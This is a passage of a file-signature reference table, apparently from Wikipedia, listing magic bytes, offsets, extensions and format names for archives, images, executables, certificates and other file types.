<code>\u2400\u2400IIXPR</code> <code>\u2400\u2400MMXPR</code> 0 qxd Quark Express document <code>50 57 53 33</code> <code>PWS3</code> 0 psafe3 Password Gorilla Password Database <code>D4 C3 B2 A1</code> (little-endian) <code>\u00d4\u00c3\u00b2\u00a1</code> 0 pcap Libpcap File Format2(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Libpcap_File_Format-2) <code>A1 B2 C3 D4</code> (big-endian) <code>\u00a1\u00b2\u00c3\u00d4</code> <code>4D 3C B2 A1</code> (little-endian) <code>M&lt;\u00b2\u00a1</code> 0 pcap Libpcap File Format (nanosecond-resolution)2(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Libpcap_File_Format-2) <code>A1 B2 3C 4D</code> (big-endian) <code>\u00a1\u00b2&lt;M</code> <code>0A 0D 0D 0A</code> <code>\u240a\u240d\u240d\u240a</code> 0 pcapng PCAP Next Generation Dump File Format3(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-3) <code>ED AB EE DB</code> <code>\u00ed\u00ab\u00ee\u00db</code> 0 rpm RedHat Package Manager (RPM) package4(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-4) <code>53 51 4C 69 74 65 20 66   6F 72 6D 61 74 20 33 00</code> <code>SQLite format 3\u2400</code> 0 sqlitedb  sqlite  db SQLite Database5(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-5) <code>53 50 30 31</code> <code>SP01</code> 0 bin Amazon Kindle Update Package6(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-6) <code>49 57 41 44</code> <code>IWAD</code> 0 wad internal WAD (main resource file of Doom)7(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-IWAD-7) <code>00</code> <code>\u2400</code> 0 PIC  PIF  SEA  YTR IBM Storyboard bitmap file  Windows Program Information File Mac Stuffit Self-Extracting Archive  IRIS OCR data file <code>00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00</code> <code>\u2400\u2400\u2400\u2400\u2400\u2400\u2400\u2400   \u2400\u2400\u2400\u2400\u2400\u2400\u2400\u2400   \u2400\u2400\u2400\u2400\u2400\u2400\u2400\u2400</code> 11 PDB PalmPilot Database/Document File <code>BE BA FE CA</code> <code>\u00be\u00ba\u00fe\u00ca</code> 0 DBA Palm Desktop Calendar Archive <code>00 01 42 44</code> <code>\u2400\u2401BD</code> 0 DBA Palm Desktop To Do Archive <code>00 01 44 54</code> <code>\u2400\u2401DT</code> 0 TDA Palm Desktop Calendar Archive <code>54 44 46 24</code> <code>TDF$</code> 0 TDF$ Telegram Desktop File <code>54 44 45 46</code> <code>TDEF</code> 0 TDEF Telegram Desktop Encrypted File <code>00 01 00 00</code> <code>\u2400\u2401\u2400\u2400</code> 0 Palm Desktop Data File (Access format) <code>00 00 01 00</code> <code>\u2400\u2400\u2401\u2400</code> 0 ico Computer icon encoded in ICO file format8(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-8) <code>69 63 6e 73</code> <code>icns</code> 0 icns Apple Icon Image format <code>66 74 79 70 33 67</code> <code>ftyp3g</code> 4 3gp  3g2 3rd Generation Partnership Project 3GPP and 3GPP2 multimedia files <code>66 74 79 70 68 65 69 6``66 74 79 70 6d</code> <code>ftypheic</code> 4 heic High Efficiency Image Container (HEIC) <code>1F 9D</code> <code>\u241f\u25a1</code> 0 z  tar.z compressed file (often tar zip) using Lempel-Ziv-Welch algorithm <code>1F A0</code> <code>\u241f\u237d</code> 0 z  tar.z Compressed file (often tar zip) using LZH algorithm <code>2D 68 6C 30 2D</code> <code>-lh0-</code> 2 lzh Lempel Ziv Huffman archive file Method 0 (No compression) <code>2D 68 6C 35 2D</code> <code>-lh5-</code> 2 lzh Lempel Ziv Huffman archive file Method 5 (8KiB sliding window) <code>42 41 43 4B 4D 49 4B 45   44 49 53 4B</code> <code>BACKMIKEDISK</code> 0 bac AmiBack Amiga Backup data file <code>49 4E 44 58</code> <code>INDX</code> 0 idx AmiBack Amiga Backup index file <code>62 70 6C 69 73 74</code> <code>bplist</code> 0 plist Binary Property List file <code>42 5A 68</code> <code>BZh</code> 0 bz2 Compressed file using Bzip2 algorithm <code>47 49 46 38 37 61</code> <code>47 49 46 38 39 61</code> <code>GIF87a</code> <code>GIF89a</code> 0 gif Image file encoded in the Graphics Interchange Format (GIF)9(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-9) <code>49 49 2A 00</code> (little-endian) <code>II*\u2400</code> 0 tif  tiff Tagged Image File Format (TIFF)10(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-10) <code>4D 4D 00 2A</code> (big-endian) <code>MM\u2400*</code> <code>49 49 2A 00 10 00 00 00   43 52</code> <code>II*\u2400\u2410\u2400\u2400\u2400CR</code> 0 cr2 Canon RAW Format Version 211(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-11)  Canon's RAW format is based on TIFF.12(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-12) <code>80 2A 5F D7</code> <code>\u20ac*_\u00d7</code> 0 cin Kodak Cineon image <code>52 4E 43 01</code> <code>52 4E 43 02</code> <code>RNC\u2401</code> <code>RNC\u2402</code> 0 Compressed file using Rob Northen Compression (version 1 and 2) algorithm13(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-13) <code>4E 55 52 55 49 4D 47</code> <code>4E 55 52 55 50 41 4C</code> <code>NURUIMG</code> <code>NURUPAL</code> 0 nui  nup nuru ASCII/ANSI image and palette files14(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-14) <code>53 44 50 58</code> (big-endian format) <code>SDPX</code> 0 dpx SMPTE DPX image <code>58 50 44 53</code> (little-endian format) <code>XPDS</code> <code>76 2F 31 01</code> <code>v/1\u2401</code> 0 exr OpenEXR image <code>42 50 47 FB</code> <code>BPG\u00fb</code> 0 bpg Better Portable Graphics format15(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-15) <code>FF D8 FF DB</code> <code>\u00ff\u00d8\u00ff\u00db</code> 0 jpg  jpeg JPEG raw or in the JFIF or Exif file format16(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-:0-16) <code>FF D8 FF E0 00 10 4A 46   49 46 00 01</code> <code>\u00ff\u00d8\u00ff\u00e0\u2400\u2410JFIF\u2400\u2401</code> <code>FF D8 FF EE</code> <code>\u00ff\u00d8\u00ff\u00ee</code> <code>FF D8 FF E1\u00a0??\u00a0?? 45 78   69 66 00 00</code> <code>\u00ff\u00d8\u00ff\u00e1??Exif\u2400\u2400</code> <code>FF D8 FF E0</code> <code>\u00ff\u00d8\u00ff\u00e0</code> 0 jpg JPEG raw or in the JFIF or Exif file format16(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-:0-16) <code>00 00 00 0C 6A 50 20 20 0D 0A 87 0A</code> <code>\u2400\u2400\u2400\u240cjP\u2420\u2420\u240d\u240a\u2021\u240a</code> 0 jp2  j2k  jpf  jpm  jpg2  j2c  jpc  jpx  mj2 JPEG 2000 format17(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-17) <code>FF 4F FF 51</code> <code>\u00ffO\u00ffQ</code> <code>71 6f 69 66</code> <code>qoif</code> 0 qoi QOI - The \u201cQuite OK Image Format\u201d18(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-18) <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   49 4C 42 4D</code> <code>FORM????ILBM</code> 0  any ilbm  lbm  ibm  iff IFF Interleaved Bitmap Image <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   38 53 56 58</code> <code>FORM????8SVX</code> 0  any 8svx  8sv  svx  snd  iff IFF 8-Bit Sampled Voice <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   41 43 42 4D</code> <code>FORM????ACBM</code> 0  any acbm  iff Amiga Contiguous Bitmap <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   41 4E 42 4D</code> <code>FORM????ANBM</code> 0  any anbm  iff IFF Animated Bitmap <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   41 4E 49 4D</code> <code>FORM????ANIM</code> 0  any anim  iff IFF CEL Animation <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   46 41 58 58</code> <code>FORM????FAXX</code> 0  any faxx  fax  iff IFF Facsimile Image <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   46 54 58 54</code> <code>FORM????FTXT</code> 0  any ftxt  iff IFF Formatted Text <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   53 4D 55 53</code> <code>FORM????SMUS</code> 0  any smus  smu  mus  iff IFF Simple Musical Score <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   43 4D 55 53</code> <code>FORM????CMUS</code> 0  any cmus  mus  iff IFF Musical Score <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   59 55 56 4E</code> <code>FORM????YUVN</code> 0  any yuvn  yuv  iff IFF YUV Image <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   46 41 4E 54</code> <code>FORM????FANT</code> 0  any iff Amiga Fantavision Movie <code>46 4F 52 4D\u00a0??\u00a0??\u00a0??\u00a0??   41 49 46 46</code> <code>FORM????AIFF</code> 0  any aiff  aif  aifc  snd  iff Audio Interchange File Format <code>4C 5A 49 50</code> <code>LZIP</code> 0 lz lzip compressed file19(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-19) <code>30 37 30 37 30 37</code> <code>070707</code> 0 cpio cpio archive file20(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Cpio_file_format-20) <code>4D 5A</code> <code>MZ</code> 0 exe  dll  mui  sys  scr  cpl  ocx  ax  iec  ime  rs  tsp  fon  efi DOS MZ executable and its descendants (including NE and PE) <code>5A 4D</code> <code>ZM</code> 0 exe DOS ZM executable and its descendants (rare) <code>50 4B 03 04</code> <code>50 4B 05 06</code> (empty archive)  <code>50 4B 07 08</code> (spanned archive) <code>PK\u2403\u2404</code> <code>PK\u2405\u2406</code> <code>PK\u2407\u2408</code> 0 zip  aar  apk  docx  epub  ipa jar  kmz  maff msix  odp  ods  odt  pk3  pk4  pptx  usdz  vsdx  xlsx  xpi zip file format and formats based on it, such as EPUB, JAR, ODF, OOXML <code>52 61 72 21 1A 07 00</code> <code>Rar!\u241a\u2407\u2400</code> 0 rar Roshal ARchive compressed archive v1.50 onwards21(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-21) <code>52 61 72 21 1A 07 01 00</code> <code>Rar!\u241a\u2407\u2401\u2400</code> 0 rar Roshal ARchive compressed archive v5.00 onwards22(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-22) <code>7F 45 4C 46</code> <code>\u2421ELF</code> 0 Executable and Linkable Format <code>89 50 4E 47 0D 0A 1A 0A</code> <code>\u2030PNG\u240d\u240a\u241a\u240a</code> 0 png Image encoded in the Portable Network Graphics format23(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-23) <code>C9</code> <code>\u00c9</code> 0 com CP/M 3 and higher with overlays24(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Elliott_CPM3_COM-24) <code>CA FE BA BE</code> <code>\u00ca\u00fe\u00ba\u00be</code> 0 class Java class file, Mach-O Fat Binary <code>EF BB BF</code> <code>\u00ef\u00bb\u00bf</code> 0 txt  others UTF-8 byte order mark, commonly seen in text files.25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)26(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-XML-26)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>FF FE</code> <code>\u00ff\u00fe</code> 0 txt  others UTF-16LE byte order mark, commonly seen in text files.25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)26(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-XML-26)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>FE FF</code> <code>\u00fe\u00ff</code> 0 txt  others UTF-16BE byte order mark, commonly seen in text files.25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)26(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-XML-26)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>FF FE 00 00</code> <code>\u00ff\u00fe\u2400\u2400</code> 0 txt  others UTF-32LE byte order mark for text25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>00 00 FE FF</code> <code>\u2400\u2400\u00fe\u00ff</code> 0 txt  others UTF-32BE byte order mark for text25(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BOM-25)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>2B 2F 76 38</code> <code>2B 2F 76 39</code> <code>2B 2F 76 2B</code> <code>2B 2F 76 2F</code> <code>+/v8</code> <code>+/v9</code> <code>+/v+</code> <code>+/v/</code> 0 UTF-7 byte order mark for text28(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BG-28)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>0E FE FF</code> <code>\u240e\u00fe\u00ff</code> 0 txt  others SCSU byte order mark for text28(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BG-28)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>DD 73 66 73</code> <code>\u00ddsfs</code> 0 UTF-EBCDIC byte order mark for text28(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-BG-28)27(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SDL-27) <code>FE ED FA CE</code> <code>\u00fe\u00ed\u00fa\u00ce</code> 0  0x1000 Mach-O binary (32-bit) <code>FE ED FA CF</code> <code>\u00fe\u00ed\u00fa\u00cf</code> 0  0x1000 Mach-O binary (64-bit) <code>FE ED FE ED</code> <code>\u00fe\u00ed\u00fe\u00ed</code> 0 JKS Javakey Store29(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-29) <code>CE FA ED FE</code> <code>\u00ce\u00fa\u00ed\u00fe</code> 0 Mach-O binary (reverse byte ordering scheme, 32-bit)30(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-apple.com-30) <code>CF FA ED FE</code> <code>\u00cf\u00fa\u00ed\u00fe</code> 0 Mach-O binary (reverse byte ordering scheme, 64-bit)30(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-apple.com-30) <code>25 21 50 53</code> <code>%!PS</code> 0 ps PostScript document <code>25 21 50 53 2D 41 64 6F 62 65 2D 33 2E 30 20 45 50 53 46 2D 33 2E 30</code> <code>%!PS-Adobe-3.0 ESPF-3.0</code> 0 eps  epsf Encapsulated PostScript file version 3.031(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Encapsulated_PostScript_(EPS)_File_Format,_Version_3.0-31) <code>25 21 50 53 2D 41 64 6F 62 65 2D 33 2E 31 20 45 50 53 46 2D 33 2E 30</code> <code>%!PS-Adobe-3.1 ESPF-3.0</code> 0 eps  epsf Encapsulated PostScript file version 3.132(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Encapsulated_PostScript_(EPS)_File_Format,_Version_3.1-32) <code>49 54 53 46 03 00 00 00   60 00 00 00</code> <code>ITSF\u2403\u2400\u2400\u2400`\u2400\u2400\u2400</code> 0 chm MS Windows HtmlHelp Data <code>3F 5F</code> <code>?_</code> 0 hlp Windows 3.x/95/98 Help file <code>25 50 44 46 2D</code> <code>%PDF-</code> 0 pdf PDF document33(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-33) <code>30 26 B2 75 8E 66 CF 11   A6 D9 00 AA 00 62 CE 6C</code> <code>0&amp;\u00b2u\u017df\u00cf\u2411\u00a6\u00d9\u2400\u00aa\u2400b\u00cel</code> 0 asf  wma  wmv Advanced Systems Format34(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-34) <code>24 53 44 49 30 30 30 31</code> <code>$SDI0001</code> 0 System Deployment Image, a disk image format used by Microsoft <code>4F 67 67 53</code> <code>OggS</code> 0 ogg  oga  ogv Ogg, an open source media container format <code>38 42 50 53</code> <code>8BPS</code> 0 psd Photoshop Document file, Adobe Photoshop's native file format <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   57 41 56 45</code> <code>RIFF????WAVE</code> 0 wav Waveform Audio File Format35(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-35) <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   41 56 49 20</code> <code>RIFF????AVI\u2420</code> 0 avi Audio Video Interleave video format36(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-36) <code>FF FB</code> <code>FF F3</code> <code>FF F2</code> <code>\u00ff\u00fb</code> <code>\u00ff\u00f3</code> <code>\u00ff\u00f2</code> 0 mp3 MPEG-1 Layer 3 file without an ID3 tag or with an ID3v1 tag (which is appended at the end of the file) <code>49 44 33</code> <code>ID3</code> 0 mp3 MP3 file with an ID3v2 container <code>42 4D</code> <code>BM</code> 0 bmp  dib BMP file, a bitmap format used mostly in the Windows world <code>43 44 30 30 31</code> <code>CD001</code> 0x8001  0x8801  0x9001 iso ISO9660 CD/DVD image file37(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-37) <code>43 44 30 30 31</code> <code>CD001</code> 0x5EAC9 cdi CD-i CD image file <code>6D 61 69 6E 2E 62 73</code> <code>main.bs</code> 0 mgw Nintendo Game &amp; Watch image file <code>4E 45 53</code> <code>NES</code> 0 nes Nintendo Entertainment System image file <code>A0 32 41 A0 A0 A0</code> <code>2A</code> 0x165A4 d64 Commodore 64 1541 disk image (D64 format) <code>47 53 52 2D 31 35 34 31</code> <code>GCR-1541</code> 0 g64 Commodore 64 1541 disk image (G64 format) <code>A0 33 44 A0 A0</code> <code>3D</code> 0x61819 d81 Commodore 64 1581 disk image (D81 format) <code>43 36 34 20 74 61 70 65 20 69 6D 61 67 65 20 66 69 6C 65</code> <code>C64 tape image file</code> 0 t64 Commodore 64 tape image <code>43 36 34 20 43 41 52 54 52 49 44 47 45 20 20 20</code> <code>C64 CARTRIDGE</code> 0 crt Commodore 64 cartridge image <code>53 49 4D 50 4C 45 20 20   3D 20 20 20 20 20 20 20   20 20 20 20 20 20 20 20   20 20 20 20 20 54</code> <code>SIMPLE\u2420\u2420   =\u2420\u2420\u2420\u2420\u2420\u2420\u2420   \u2420\u2420\u2420\u2420\u2420\u2420\u2420\u2420   \u2420\u2420\u2420\u2420\u2420T</code> 0 fits Flexible Image Transport System (FITS)38(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-38) <code>66 4C 61 43</code> <code>fLaC</code> 0 flac Free Lossless Audio Codec39(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-39) <code>4D 54 68 64</code> <code>MThd</code> 0 mid  midi MIDI sound file40(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-40) <code>D0 CF 11 E0 A1 B1 1A E1</code> <code>\u00d0\u00cf\u2411\u00e0\u00a1\u00b1\u241a\u00e1</code> 0 doc  xls  ppt  msi  msg Compound File Binary Format, a container format defined by Microsoft COM. It can contain the equivalent of files and directories. It is used by Windows Installer and for documents in older versions of Microsoft Office.41(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-41) It can be used by other programs as well that rely on the COM and OLE API's. <code>64 65 78 0A 30 33 35 00</code> <code>dex\u240a035\u2400</code> 0 dex Dalvik Executable <code>4B 44 4D</code> <code>KDM</code> 0 vmdk VMDK files42(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-42)43(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-43) <code>23 20 44 69 73 6B 20 44 65 73 63 72 69 70 74 6F</code> <code># Disk Descripto</code> 0 vmdk VMware 4 Virtual Disk description file (split disk) <code>43 72 32 34</code> <code>Cr24</code> 0 crx Google Chrome extension44(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-44) or packaged app45(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-45) <code>41 47 44 33</code> <code>AGD3</code> 0 fh8 FreeHand 8 document46(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-46)47(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-47) <code>05 07 00 00 42 4F 42 4F   05 07 00 00 00 00 00 00   00 00 00 00 00 01</code> <code>\u2405\u2407\u2400\u2400BOBO   \u2405\u2407\u2400\u2400\u2400\u2400\u2400\u2400   \u2400\u2400\u2400\u2400\u2400\u2401</code> 0 cwk AppleWorks 5 document <code>06 07 E1 00 42 4F 42 4F   06 07 E1 00 00 00 00 00   00 00 00 00 00 01</code> <code>\u2406\u2407\u00e1\u2400BOBO   \u2406\u2407\u00e1\u2400\u2400\u2400\u2400\u2400   \u2400\u2400\u2400\u2400\u2400\u2401</code> 0 cwk AppleWorks 6 document <code>45 52 02 00 00 00</code> <code>ER\u2402\u2400\u2400\u2400</code> 0 toast Roxio Toast disc image file <code>8B 45 52 02 00 00 00</code> <code>\u2039ER\u2402\u2400\u2400\u2400</code> <code>6B 6F 6C 79</code> <code>koly</code> end\u2013512 dmg Apple Disk Image file <code>78 61 72 21</code> <code>xar!</code> 0 xar eXtensible ARchive format48(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-48) <code>50 4D 4F 43 43 4D 4F 43</code> <code>PMOCCMOC</code> 0 dat Windows Files And Settings Transfer Repository49(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-49) See also USMT 3.0 (Win XP)50(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-50) and USMT 4.0 (Win 7)51(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-51) User Guides <code>4E 45 53 1A</code> <code>NES\u241a</code> 0 nes Nintendo Entertainment System ROM file52(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-52) <code>75 73 74 61 72 00 30 30</code> <code>75 73 74 61 72 20 20 00</code> <code>ustar\u240000</code> <code>ustar\u2420\u2420\u2400</code> 257 tar tar archive53(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-53) <code>4F 41 52\u00a0??</code> <code>OAR?</code> 0 oar OAR file archive format, where\u00a0?? is the format version. <code>74 6F 78 33</code> <code>tox3</code> 0 tox Open source portable voxel file54(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-54) <code>4D 4C 56 49</code> <code>MLVI</code> 0 MLV Magic Lantern Video file55(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-55) <code>44 43 4D 01 50 41 33 30</code> <code>50 41 33 30</code> <code>DCM\u2401PA30</code> <code>PA30</code> 0 Windows Update Binary Delta Compression file56(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-56) <code>37 7A BC AF 27 1C</code> <code>7z\u00bc\u00af'\u241c</code> 0 7z 7-Zip File Format <code>1F 8B</code> <code>\u241f\u2039</code> 0 gz  tar.gz GZIP compressed file57(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-57) <code>FD 37 7A 58 5A 00</code> <code>\u00fd7zXZ\u2400</code> 0 xz  tar.xz XZ compression utility  using LZMA2 compression <code>04 22 4D 18</code> <code>\u2404\"M\u2418</code> 0 lz4 LZ4 Frame Format58(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-58)  Remark: LZ4 block format does not offer any magic bytes.59(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-59) <code>4D 53 43 46</code> <code>MSCF</code> 0 cab Microsoft Cabinet file <code>53 5A 44 44 88 F0 27 33</code> <code>SZDD\u02c6\u00f0'3</code> 0 ??_ Microsoft compressed file in Quantum format, used prior to Windows XP. File can be decompressed using Extract.exe or Expand.exe distributed with earlier versions of Windows. After compression, the last character of the original filename extension is replaced with an underscore, e.g. \u2018Setup.exe\u2019 becomes \u2018Setup.ex_\u2019. <code>46 4C 49 46</code> <code>FLIF</code> 0 flif Free Lossless Image Format <code>1A 45 DF A3</code> <code>\u241aE\u00df\u00a3</code> 0 mkv  mka  mks  mk3d  webm Matroska media container, including WebM <code>4D 49 4C 20</code> <code>MIL\u2420</code> 0 stg \"SEAN\u00a0: Session Analysis\" Training file. Also used in compatible software \"Rpw\u00a0: Rowperfect for Windows\" and \"RP3W\u00a0: ROWPERFECT3 for Windows\". <code>41 54 26 54 46 4F 52 4D   \u00a0??\u00a0??\u00a0??\u00a0?? 44 4A 56</code> <code>AT&amp;TFORM????DJV</code> 0 djvu  djv DjVu document  The following byte is either <code>55</code> (<code>U</code>) for single-page or <code>4D</code> (<code>M</code>) for multi-page documents. <code>30 82</code> <code>0\u201a</code> 0 der DER encoded X.509 certificate <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 43 45 52 54 49 46 49 43 41 54 45 2D 2D 2D 2D 2D</code> <code>-----BEGIN CERTIFICATE-----</code> 0 crt  pem PEM encoded X.509 certificate <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 43 45 52 54 49 46 49 43 41 54 45 20 52 45 51 55 45 53 54 2D 2D 2D 2D 2D</code> <code>-----BEGIN CERTIFICATE REQUEST-----</code> 0 csr  pem PEM encoded X.509 Certificate Signing Request <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 50 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN PRIVATE KEY-----</code> 0 key  pem PEM encoded X.509 PKCS#8 private key <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 44 53 41 20 50 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN DSA PRIVATE KEY-----</code> 0 key  pem PEM encoded X.509 PKCS#1 DSA private key <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 52 45 41 20 50 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN RSA PRIVATE KEY-----</code> 0 key  pem PEM encoded X.509 PKCS#1 RSA private key <code>50 75 54 54 59 2D 55 73 65 72 2D 4B 65 79 2D 46 69 6C 65 2D 32 3A</code> <code>PuTTY-User-Key-File-2:</code> 0 ppk PuTTY private key file version 2 <code>50 75 54 54 59 2D 55 73 65 72 2D 4B 65 79 2D 46 69 6C 65 2D 33 3A</code> <code>PuTTY-User-Key-File-3:</code> 0 ppk PuTTY private key file version 3 <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 4F 50 45 4E 53 53 48 20 50 52 49 56 41 54 45 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN OPENSSH PRIVATE KEY-----</code> 0 OpenSSH private key file <code>2D 2D 2D 2D 2D 42 45 47 49 4E 20 53 53 48 32 20 4B 45 59 2D 2D 2D 2D 2D</code> <code>-----BEGIN SSH2 PUBLIC KEY-----</code> 0 pub OpenSSH public key file <code>44 49 43 4D</code> <code>DICM</code> 128 dcm DICOM Medical File Format <code>77 4F 46 46</code> <code>wOFF</code> 0 woff WOFF File Format 1.060(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-60) <code>77 4F 46 32</code> <code>wOF2</code> 0 woff2 WOFF File Format 2.061(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-61) <code>3C 3F 78 6D 6C 20</code> <code>&lt;?xml\u2420</code> 0  after BOM xml eXtensible Markup Language26(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-XML-26)62(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-62) <code>3C 00 3F 00 78 00 6D 00   6C 00 20</code> <code>&lt;\u2400?\u2400x\u2400m\u2400l\u2400\u2420\u2400</code> <code>00 3C 00 3F 00 78 00 6D   00 6C 00 20</code> <code>\u2400&lt;\u2400?\u2400x\u2400m\u2400l\u2400\u2420</code> <code>3C 00 00 00 3F 00 00 00   78 00 00 00 6D 00 00 00   6C 00 00 00 20 00 00 00</code> <code>&lt;\u2400\u2400\u2400?\u2400\u2400\u2400   x\u2400\u2400\u2400m\u2400\u2400\u2400   l\u2400\u2400\u2400\u2420\u2400\u2400\u2400</code> <code>00 00 00 3C 00 00 00 3F   00 00 00 78 00 00 00 6D   00 00 00 6C 00 00 00 20</code> <code>\u2400\u2400\u2400&lt;\u2400\u2400\u2400?   \u2400\u2400\u2400x\u2400\u2400\u2400m   \u2400\u2400\u2400l\u2400\u2400\u2400\u2420</code> <code>4C 6F A7 94 93 40</code> <code>Lo\u00a7\u201d\u201c@</code> <code>00 61 73 6D</code> <code>\u2400asm</code> 0 wasm WebAssembly binary format63(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-63) <code>CF 84 01</code> <code>\u00cf\u201e\u2401</code> 0 lep Lepton compressed JPEG image64(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-64) <code>43 57 53</code> <code>CWS</code> 0 swf Adobe Flash .swf <code>46 57 53</code> <code>FWS</code> <code>21 3C 61 72 63 68 3E 0A</code> <code>!&lt;arch&gt;\u240a</code> 0 deb linux deb file <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   57 45 42 50</code> <code>RIFF????WEBP</code> 0 webp Google WebP image file, where\u00a0??\u00a0??\u00a0??\u00a0?? is the file size. More information on WebP File Header <code>27 05 19 56</code> <code>'\u2405\u2419V</code> 0 U-Boot / uImage. Das U-Boot Universal Boot Loader.65(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-65) <code>7B 5C 72 74 66 31</code> <code>{\\rtf1</code> 0 rtf Rich Text Format <code>54 41 50 45</code> <code>TAPE</code> 0 Microsoft Tape Format <code>47</code> <code>G</code> 0  0xBC  0x178  